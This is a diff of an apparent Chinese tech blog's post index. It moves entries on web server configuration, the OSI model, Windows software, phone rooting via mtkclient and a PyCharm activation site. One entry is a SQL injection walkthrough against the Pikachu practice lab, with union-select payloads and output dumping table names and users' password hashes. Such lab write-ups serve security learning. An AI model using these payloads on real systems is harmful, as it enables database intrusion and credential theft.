-<h3 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www.example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory /var/www/html&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>说明：</p>
-<ul>
-<li><code>ServerName</code>：指定主机名。</li>
-<li><code>DocumentRoot</code>：指定网站根目录。</li>
-<li><code>&lt;Directory&gt;</code>：设置对该目录的访问规则。</li>
-</ul>
-<hr>
-<h2 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h2><blockquote>
-<p>配置文件位置：</p>
-<ul>
-<li>Debian&#x2F;Ubuntu: <code>/etc/nginx/sites-available/default</code></li>
-<li>CentOS&#x2F;RHEL: <code>/etc/nginx/nginx.conf</code></li>
-</ul>
-<p>启动&#x2F;重启命令：</p>
-<ul>
-<li>Debian&#x2F;Ubuntu&#x2F;CentOS&#x2F;RHEL 通用：<code>sudo systemctl restart nginx</code></li>
-</ul>
-</blockquote>
-<h3 id="示例配置-1"><a href="#示例配置-1" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html index.php;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>说明：</p>
-<ul>
-<li><code>listen 80</code>：监听80端口。</li>
-<li><code>server_name</code>：指定主机名。</li>
-<li><code>root</code>：指定网站根目录。</li>
-<li><code>try_files</code>：检查请求是否为实际存在的文件，否则显示404。</li>
-</ul>
-<h3 id="仅允许域名访问"><a href="#仅允许域名访问" class="headerlink" title="仅允许域名访问"></a>仅允许域名访问</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先处理非法 Host</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许指定的域名</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>原理：</p>
-<ol>
-<li>第一个 server_name _ 区块匹配所有没有匹配到指定 server_name 的请求，直接 404。</li>
-<li>第二个只允许 <a href="http://www.example.com./">www.example.com。</a></li>
-</ol>
+    <title>oppoA9 mtk手机root</title>
+    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
+    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
+<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
+<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
+</code></pre>
+<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
+<p><img src="/images/pasted-2.png" alt="upload successful"></p>
+<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
+<p><img src="/images/pasted-3.png" alt="upload successful"></p>
 ]]></content>
       <categories>
-        <category>系统运维</category>
-        <category>基础学习篇</category>
+        <category>手机搞机</category>
       </categories>
       <tags>
-        <tag>apache</tag>
-        <tag>nginx</tag>
+        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -2521,6 +2521,150 @@ run
       </tags>
   </entry>
   <entry>
+    <title>OSI模型</title>
+    <url>/2025/06/23/osi/</url>
+    <content><![CDATA[<h2 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h2><p>Open Systems Interconnection Model<br>「开放式系统互联参考模型」</p>
+<h2 id="模型内容"><a href="#模型内容" class="headerlink" title="模型内容"></a>模型内容</h2><table>
+<thead>
+<tr>
+<th>层次</th>
+<th>名称</th>
+<th>常见协议</th>
+<th>主要作用</th>
+<th>封装结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7</td>
+<td>应用层</td>
+<td>HTTP、HTTPS、FTP、DNS、SSH、Telnet</td>
+<td>提供应用接口，和应用直接交互</td>
+<td>原始数据 (Data)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>表示层</td>
+<td>JPEG、MPEG、TLS、SSL</td>
+<td>对数据进行编解码、加密解密、压缩解压</td>
+<td>原始数据 (Data)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>会话层</td>
+<td>RPC、PPTP、SIP</td>
+<td>管理建立、维持和终止应用之间的会话</td>
+<td>原始数据 (Data)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>传输层</td>
+<td>TCP、UDP</td>
+<td>提供端到端传输、流量控制、错误检测</td>
+<td>段 (Segment) 或 报文 (Datagram)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>网络层</td>
+<td>IP、ICMP、IGMP、OSPF、BGP</td>
+<td>路由、寻址、分片及转发</td>
+<td>包 (Packet)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>数据链路层</td>
+<td>Ethernet、PPP、ARP、STP</td>
+<td>节点之间的数据帧封装、媒体访问控制</td>
+<td>帧 (Frame)</td>
+</tr>
+<tr>
+<td>1</td>
+<td>物理层</td>
+<td>以太网接口、WiFi、光纤</td>
+<td>比特传输、定义接口和传输标准</td>
+<td>比特 (Bit)</td>
+</tr>
+</tbody></table>
+<h3 id="简单示意封装结构"><a href="#简单示意封装结构" class="headerlink" title="简单示意封装结构"></a>简单示意封装结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用层 (Data) </span><br><span class="line">   ↓ </span><br><span class="line">传输层 (Header + Data) -&gt; Segment/Datagram</span><br><span class="line">   ↓ </span><br><span class="line">网络层 (Header + Segment) -&gt; Packet</span><br><span class="line">   ↓ </span><br><span class="line">数据链路层 (Header + Packet + Trailer) -&gt; Frame</span><br><span class="line">   ↓ </span><br><span class="line">物理层 (Bit Stream) -&gt; 比特传输</span><br></pre></td></tr></table></figure>
+
+<p>好，我来<strong>详细解释封装结构</strong>，让你彻底明白 OSI 模型中每层是如何一层层封装起来的：</p>
+<hr>
+<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><h3 id="1-应用层、表示层、会话层"><a href="#1-应用层、表示层、会话层" class="headerlink" title="1. 应用层、表示层、会话层"></a>1. 应用层、表示层、会话层</h3><p><strong>结构</strong>：原始数据</p>
+<ul>
+<li>在应用层、表示层、会话层阶段，传输的数据其实就是<strong>应用生成的原始数据</strong>，没有额外的数据头。</li>
+<li>例如：一封邮件内容、一段 HTTP 请求。</li>
+</ul>
+<hr>
+<h3 id="2-传输层"><a href="#2-传输层" class="headerlink" title="2. 传输层"></a>2. 传输层</h3><p><strong>结构</strong>：<code>传输层头部 + 原始数据</code> → 段 (Segment) 或 报文 (Datagram)</p>
+<ul>
+<li><p>在这一层，传输层（TCP 或 UDP）为原始数据添加自己的<strong>头部</strong>。</p>
+</li>
+<li><p>这个头部里有：</p>
+<ul>
+<li>源端口、目标端口</li>
+<li>序列号、确认号</li>
+<li>检查和控制标记</li>
+</ul>
+</li>
+<li><p>完成后，形成 <strong>“段”</strong> (TCP) 或 <strong>“报文”</strong> (UDP)。</p>
+</li>
+</ul>
+<p>💡 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[传输层头] + [应用层的数据]</span><br><span class="line">       ↓</span><br><span class="line">     Segment / Datagram</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-网络层"><a href="#3-网络层" class="headerlink" title="3. 网络层"></a>3. 网络层</h3><p><strong>结构</strong>：<code>网络层头 + 段</code> → 包 (Packet)</p>
+<ul>
+<li><p>网络层（如 IP）在段的外面再套一层<strong>网络层头</strong>。</p>
+</li>
+<li><p>网络层头里有：</p>
+<ul>
+<li>源 IP、目标 IP</li>
+<li>路由标记、TTL (生存时间) 等</li>
+</ul>
+</li>
+<li><p>完成后，形成 <strong>“包”</strong>。</p>
+</li>
+</ul>
+<p>💡 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[网络层头] + [传输层段] </span><br><span class="line">       ↓</span><br><span class="line">       Packet</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-数据链路层"><a href="#4-数据链路层" class="headerlink" title="4. 数据链路层"></a>4. 数据链路层</h3><p><strong>结构</strong>：<code>链路层头 + 包 + 链路层尾</code> → 帧 (Frame)</p>
+<ul>
+<li><p>在这个阶段，数据链路层（以太网、PPP）为网络层的包添加：</p>
+<ul>
+<li>源 MAC、目标 MAC</li>
+<li>类型字段</li>
+<li>CRC 校验等</li>
+</ul>
+</li>
+<li><p>完成后，形成 <strong>“帧”</strong>。</p>
+</li>
+</ul>
+<p>💡 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[链路层头] + [网络层包] + [链路层尾]</span><br><span class="line">       ↓</span><br><span class="line">       Frame</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-物理层"><a href="#5-物理层" class="headerlink" title="5. 物理层"></a>5. 物理层</h3><p><strong>结构</strong>：比特流 (Bit Stream)</p>
+<ul>
+<li>物理层只是对<strong>帧</strong>进行电气、光学、射频等调制，形成连续的比特序列。</li>
+<li>在这一层，数据就是真正以<strong>位</strong>(Bit)的形式在网线、光纤、无线等媒体上传输。</li>
+</ul>
+<p>💡 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Frame ---&gt; 011011001100101011... (Bit Stream)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="简单总结结构"><a href="#简单总结结构" class="headerlink" title="简单总结结构"></a>简单总结结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用层 ：Data</span><br><span class="line">传输层 ：Header + Data           ➔ Segment / Datagram</span><br><span class="line">网络层 ：Header + Segment        ➔ Packet</span><br><span class="line">链路层 ：Header + Packet + Tail ➔ Frame</span><br><span class="line">物理层 ：Bit Stream              ➔ Bits</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>网络基础</category>
+      </categories>
+      <tags>
+        <tag>osi</tag>
+        <tag>网络基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pycharm激活</title>
     <url>/2024/08/10/pycharm%E6%BF%80%E6%B4%BB/</url>
     <content><![CDATA[<h2 id="检查链接"><a href="#检查链接" class="headerlink" title="检查链接"></a>检查链接</h2><p>网址：<a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p>
@@ -2539,6 +2683,54 @@ run
       <tags>
         <tag>工具安装</tag>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-pikachu</title>
+    <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
+<h3 id="获取当前数据库名称和版本"><a href="#获取当前数据库名称和版本" class="headerlink" title="获取当前数据库名称和版本"></a>获取当前数据库名称和版本</h3><ol>
+<li><p>抓包修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select database(),version()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-92.png" alt="upload successful"></p>
+</li>
+<li><p>可以得出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,pikachu</span><br><span class="line">your email is: 5.7.26-0ubuntu0.18.04.1-log</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="获取该数据库表名"><a href="#获取该数据库表名" class="headerlink" title="获取该数据库表名"></a>获取该数据库表名</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,httpinfo,member,message,users,xssblind</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="查看表users的列名"><a href="#查看表users的列名" class="headerlink" title="查看表users的列名"></a>查看表users的列名</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,id,username,password,level</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="查看表users中的账号密码"><a href="#查看表users中的账号密码" class="headerlink" title="查看表users中的账号密码"></a>查看表users中的账号密码</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(username),group_concat(password) from users&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="得到的密码进行解码"><a href="#得到的密码进行解码" class="headerlink" title="得到的密码进行解码"></a>得到的密码进行解码</h3><p>随便搜索在线解密<br><img src="/images/pasted-93.png" alt="upload successful"></p>
+<blockquote>
+<p>其他注入类型原理相似，通过找到SQL命令可执行的格式进行注入，通过sqlmap都能成功注入</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>sql注入</tag>
+        <tag>pikachu</tag>
       </tags>
   </entry>
   <entry>
@@ -2693,54 +2885,6 @@ run
 ]]></content>
   </entry>
   <entry>
-    <title>sql注入-pikachu</title>
-    <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
-<h3 id="获取当前数据库名称和版本"><a href="#获取当前数据库名称和版本" class="headerlink" title="获取当前数据库名称和版本"></a>获取当前数据库名称和版本</h3><ol>
-<li><p>抓包修改参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select database(),version()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-92.png" alt="upload successful"></p>
-</li>
-<li><p>可以得出结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,pikachu</span><br><span class="line">your email is: 5.7.26-0ubuntu0.18.04.1-log</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="获取该数据库表名"><a href="#获取该数据库表名" class="headerlink" title="获取该数据库表名"></a>获取该数据库表名</h3><ol>
-<li><p>修改参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,httpinfo,member,message,users,xssblind</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="查看表users的列名"><a href="#查看表users的列名" class="headerlink" title="查看表users的列名"></a>查看表users的列名</h3><ol>
-<li><p>修改参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,id,username,password,level</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="查看表users中的账号密码"><a href="#查看表users中的账号密码" class="headerlink" title="查看表users中的账号密码"></a>查看表users中的账号密码</h3><ol>
-<li><p>修改参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(username),group_concat(password) from users&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="得到的密码进行解码"><a href="#得到的密码进行解码" class="headerlink" title="得到的密码进行解码"></a>得到的密码进行解码</h3><p>随便搜索在线解密<br><img src="/images/pasted-93.png" alt="upload successful"></p>
-<blockquote>
-<p>其他注入类型原理相似，通过找到SQL命令可执行的格式进行注入，通过sqlmap都能成功注入</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>sql注入</tag>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>switch-大气层与模拟器局域网联机</title>
     <url>/2025/05/01/switch-%E5%A4%A7%E6%B0%94%E5%B1%82%E4%B8%8E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%B1%80%E5%9F%9F%E7%BD%91%E8%81%94%E6%9C%BA/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大气层与大气层，模拟器与模拟器都有了联机方法，但是大气层与模拟器不能直接联机</p>
@@ -2775,6 +2919,66 @@ run
       </categories>
       <tags>
         <tag>switch大气层</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows-好用软件</title>
+    <url>/2025/02/24/windows-%E5%A5%BD%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="U盘工具"><a href="#U盘工具" class="headerlink" title="U盘工具"></a>U盘工具</h2><h3 id="rufus"><a href="#rufus" class="headerlink" title="rufus"></a>rufus</h3><blockquote>
+<p>下载地址：<br><a href="https://rufus.ie/zh/">https://rufus.ie/zh/</a></p>
+</blockquote>
+<hr>
+<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><h3 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h3><blockquote>
+<p>下载地址：<br><a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
+</blockquote>
+<hr>
+<h2 id="ssh远程工具"><a href="#ssh远程工具" class="headerlink" title="ssh远程工具"></a>ssh远程工具</h2><h3 id="mobaxterm"><a href="#mobaxterm" class="headerlink" title="mobaxterm"></a>mobaxterm</h3><blockquote>
+<p>下载地址：<br><a href="https://mobaxterm.mobatek.net/download.html">https://mobaxterm.mobatek.net/download.html</a></p>
+</blockquote>
+<hr>
+<h2 id="ps手柄驱动"><a href="#ps手柄驱动" class="headerlink" title="ps手柄驱动"></a>ps手柄驱动</h2><h3 id="ds4-windows"><a href="#ds4-windows" class="headerlink" title="ds4-windows"></a>ds4-windows</h3><p>windows使用ps手柄，会和steam手柄识别冲突</p>
+<blockquote>
+<p>下载地址：<br><a href="https://ds4-windows.com/download/ryochan7-ds4windows/">https://ds4-windows.com/download/ryochan7-ds4windows/</a></p>
+</blockquote>
+<hr>
+<h2 id="远程同屏游戏"><a href="#远程同屏游戏" class="headerlink" title="远程同屏游戏"></a>远程同屏游戏</h2><h3 id="Parsec"><a href="#Parsec" class="headerlink" title="Parsec"></a>Parsec</h3><blockquote>
+<p>下载地址：<br><a href="https://parsec.app/downloads">https://parsec.app/downloads</a></p>
+</blockquote>
+<hr>
+<h2 id="文件检索"><a href="#文件检索" class="headerlink" title="文件检索"></a>文件检索</h2><h3 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h3><blockquote>
+<p>下载地址：<br><a href="https://www.voidtools.com/zh-cn/downloads/">https://www.voidtools.com/zh-cn/downloads/</a></p>
+</blockquote>
+<hr>
+<h2 id="控制手机"><a href="#控制手机" class="headerlink" title="控制手机"></a>控制手机</h2><h3 id="anlink"><a href="#anlink" class="headerlink" title="anlink"></a>anlink</h3><blockquote>
+<p>下载地址：（或者windows商店）<br><a href="https://cn.anlinksoft.com/">https://cn.anlinksoft.com/</a></p>
+</blockquote>
+<hr>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="universal-ftp-server"><a href="#universal-ftp-server" class="headerlink" title="universal ftp server"></a>universal ftp server</h3><blockquote>
+<p>下载地址：<br>windows应用商店</p>
+</blockquote>
+<hr>
+<h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><h3 id="小红车"><a href="#小红车" class="headerlink" title="小红车"></a>小红车</h3><blockquote>
+<p>下载地址：<br>steam搜索 <strong>Wallpaper Engine</strong></p>
+</blockquote>
+<h3 id="wallhaven网站"><a href="#wallhaven网站" class="headerlink" title="wallhaven网站"></a>wallhaven网站</h3><blockquote>
+<p>地址：<br><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></p>
+</blockquote>
+<hr>
+<h2 id="视频文件"><a href="#视频文件" class="headerlink" title="视频文件"></a>视频文件</h2><h3 id="VLC"><a href="#VLC" class="headerlink" title="VLC"></a>VLC</h3><blockquote>
+<p>下载地址：（或者windows商店）<br><a href="https://www.videolan.org/vlc/index.zh_CN.html">https://www.videolan.org/vlc/index.zh_CN.html</a></p>
+</blockquote>
+<hr>
+<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h3 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h3><blockquote>
+<p>下载地址：<br><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview</a></p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>好用软件</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+        <tag>资源</tag>
       </tags>
   </entry>
   <entry>
@@ -3120,66 +3324,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>windows-好用软件</title>
-    <url>/2025/02/24/windows-%E5%A5%BD%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="U盘工具"><a href="#U盘工具" class="headerlink" title="U盘工具"></a>U盘工具</h2><h3 id="rufus"><a href="#rufus" class="headerlink" title="rufus"></a>rufus</h3><blockquote>
-<p>下载地址：<br><a href="https://rufus.ie/zh/">https://rufus.ie/zh/</a></p>
-</blockquote>
-<hr>
-<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><h3 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h3><blockquote>
-<p>下载地址：<br><a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
-</blockquote>
-<hr>
-<h2 id="ssh远程工具"><a href="#ssh远程工具" class="headerlink" title="ssh远程工具"></a>ssh远程工具</h2><h3 id="mobaxterm"><a href="#mobaxterm" class="headerlink" title="mobaxterm"></a>mobaxterm</h3><blockquote>
-<p>下载地址：<br><a href="https://mobaxterm.mobatek.net/download.html">https://mobaxterm.mobatek.net/download.html</a></p>
-</blockquote>
-<hr>
-<h2 id="ps手柄驱动"><a href="#ps手柄驱动" class="headerlink" title="ps手柄驱动"></a>ps手柄驱动</h2><h3 id="ds4-windows"><a href="#ds4-windows" class="headerlink" title="ds4-windows"></a>ds4-windows</h3><p>windows使用ps手柄，会和steam手柄识别冲突</p>
-<blockquote>
-<p>下载地址：<br><a href="https://ds4-windows.com/download/ryochan7-ds4windows/">https://ds4-windows.com/download/ryochan7-ds4windows/</a></p>
-</blockquote>
-<hr>
-<h2 id="远程同屏游戏"><a href="#远程同屏游戏" class="headerlink" title="远程同屏游戏"></a>远程同屏游戏</h2><h3 id="Parsec"><a href="#Parsec" class="headerlink" title="Parsec"></a>Parsec</h3><blockquote>
-<p>下载地址：<br><a href="https://parsec.app/downloads">https://parsec.app/downloads</a></p>
-</blockquote>
-<hr>
-<h2 id="文件检索"><a href="#文件检索" class="headerlink" title="文件检索"></a>文件检索</h2><h3 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h3><blockquote>
-<p>下载地址：<br><a href="https://www.voidtools.com/zh-cn/downloads/">https://www.voidtools.com/zh-cn/downloads/</a></p>
-</blockquote>
-<hr>
-<h2 id="控制手机"><a href="#控制手机" class="headerlink" title="控制手机"></a>控制手机</h2><h3 id="anlink"><a href="#anlink" class="headerlink" title="anlink"></a>anlink</h3><blockquote>
-<p>下载地址：（或者windows商店）<br><a href="https://cn.anlinksoft.com/">https://cn.anlinksoft.com/</a></p>
-</blockquote>
-<hr>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="universal-ftp-server"><a href="#universal-ftp-server" class="headerlink" title="universal ftp server"></a>universal ftp server</h3><blockquote>
-<p>下载地址：<br>windows应用商店</p>
-</blockquote>
-<hr>
-<h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><h3 id="小红车"><a href="#小红车" class="headerlink" title="小红车"></a>小红车</h3><blockquote>
-<p>下载地址：<br>steam搜索 <strong>Wallpaper Engine</strong></p>
-</blockquote>
-<h3 id="wallhaven网站"><a href="#wallhaven网站" class="headerlink" title="wallhaven网站"></a>wallhaven网站</h3><blockquote>
